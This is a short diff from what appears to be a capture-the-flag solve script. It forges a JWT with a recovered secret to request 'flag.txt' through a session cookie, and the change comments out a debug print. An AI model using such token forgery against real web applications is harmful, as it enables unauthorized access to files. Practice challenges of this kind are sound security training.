@@ -25,7 +25,7 @@ def solve():
 
     # use secret to make jwt for flag file
     token = jwt.encode({'filename': 'flag.txt'}, secret, algorithm='HS256')
-    print(token.decode('utf-8'))
+    #print(token.decode('utf-8'))
 
     # set our cookie and make request for flag
     s.cookies['jwt'] = token.decode('utf-8')
